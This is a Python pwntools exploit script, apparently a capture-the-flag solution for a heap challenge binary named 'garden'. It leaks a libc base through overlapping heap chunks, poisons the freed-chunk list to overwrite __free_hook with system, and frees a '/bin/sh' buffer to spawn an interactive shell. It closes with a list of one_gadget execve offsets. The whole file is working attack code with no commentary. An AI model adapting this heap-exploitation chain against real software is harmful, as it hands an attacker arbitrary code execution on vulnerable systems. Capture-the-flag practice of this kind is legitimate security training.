from pwn import *

context.log_level = 'debug'

p = process('./garden')
#p=remote('119.3.89.93','8011')
#elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')

def add(idx,con):
    p.sendlineafter('>> ',str(1))
    p.sendlineafter('tree index?',str(idx))
    p.sendafter('tree name?',con)

def back():
    p.sendlineafter('>> ',str(6))

def dele(idx):
    p.sendlineafter('>> ',str(2))
    p.sendlineafter('tree index?',str(idx))

def show(idx):
    p.sendlineafter('>> ',str(3))
    p.sendlineafter('tree index?',str(idx))


def steal(idx):
    p.sendlineafter('>> ',str(5))
    p.sendlineafter('which tree do you want to steal?',str(idx))

for i in range (9):
    add(i,'abcd')
dele(8)
dele(0)
dele(1)
dele(5)
dele(3)
dele(4)

#6,7
dele(2)

steal(7)

dele(6)#unsorted
add(0,'aaa')
#add(1,'bbb')
dele(7)

for i in range(7):
    add(i+1,'aaa')  #use 1
back()
add(8,'aaaaaaaa')#overlap
show(8)
p.recvuntil('aaaaaaaa')
libc_base=u64(p.recv(6).ljust(8,'\x00'))-0x1eabe0
print(hex(libc_base))
dele(2)
dele(3)
dele(4)

dele(1)
dele(8)
free_hook=libc_base+0x1edb20
system=libc_base+0x554e0
payload=p64(0)*27+p64(0x111)+p64(free_hook)



add(1,payload)
add(2,'/bin/sh\x00')
add(3,p64(system))

#gdb.attach(p)
dele(2)
#gdb.attach(p)
p.interactive()
'''
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
